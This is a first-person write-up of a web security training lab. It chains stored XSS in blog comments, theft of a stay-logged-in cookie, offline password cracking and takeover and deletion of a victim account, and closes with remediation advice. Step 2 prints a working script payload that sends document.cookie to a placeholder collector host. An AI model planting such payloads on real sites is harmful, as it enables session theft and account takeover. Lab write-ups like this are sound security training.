# Lab: Offline Password Cracking

**Difficulty:** Practitioner  
**Status:** Solved  
**Category:** Cross-Site Scripting (XSS) / Authentication

## Objective

Exploit the XSS vulnerability in the blog comments to obtain Carlos's `stay-logged-in` cookie, crack his password offline, log in as Carlos, and delete his account.

## Steps to Solve

1. **Find the XSS vulnerability**  
    I explored the blog and tested the comment functionality. I discovered that the comments were vulnerable to stored XSS.
    
2. **Extract the cookie**  
    I submitted the following payload in a comment to send the victim's cookie to my authorized Burp Collaborator endpoint:
    
    ```
    <script>
    fetch('https://My-COLLABORATOR-URL/?c='+document.cookie)
    </script>
    ```
    
3. **Retrieve the persistent-login cookie**  
    I monitored Burp Collaborator and retrieved Carlos's `stay-logged-in` cookie from the incoming request.
    
4. **Crack the password offline**  
    I decoded the cookie and extracted the password hash. I then cracked the hash offline and recovered Carlos's password:
    
    `onceuponatime`
    
5. **Log in as Carlos**  
    I used the victim's credentials to log in:
    
    - **Username:** `carlos`
        
    - **Password:** `onceuponatime`
        
6. **Delete the account**  
    After logging in successfully, I opened the **My account** page and deleted Carlos's account. The lab confirmed successful completion.
    

## Proof of Solution

### Screenshot 1 — Stored XSS
![[Pasted image 20261013182921.png]]
Show the blog comment containing the XSS payload.

### Screenshot 2 — Cookie Extraction
![[Pasted image 20261013183000.png]]
Show the Burp Collaborator interaction containing the captured cookie. Redact the actual cookie value before publishing.

### Screenshot 3 — Offline Password Cracking
![[Pasted image 20261013183120.png]]
Show the decoded cookie structure and the recovered password hash, with sensitive values redacted where appropriate.

### Screenshot 4 — Account Deletion
![[Pasted image 20261013183226.png]]
Show the successful account deletion or the lab's solved status.

## What I Learned

- Stored XSS can execute JavaScript in another user's browser.
    
- Exposed authentication cookies can allow account impersonation.
    
- Weak or fast password hashes can be vulnerable to offline cracking.
    
- Combining XSS with weak cookie security can lead to account compromise.
    

## Remediation

- Apply context-aware output encoding to user-generated comments.
    
- Sanitize HTML input and use a suitable Content Security Policy (CSP).
    
- Set authentication cookies with the `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
    
- Avoid storing password hashes in persistent-login cookies.
    
- Use modern password hashing algorithms such as Argon2id for password storage.
    

## Conclusion

The lab demonstrated how a stored XSS vulnerability can expose an authentication cookie, enabling offline password cracking and account takeover. Using the recovered credentials, I accessed Carlos's account and deleted it, successfully solving the lab.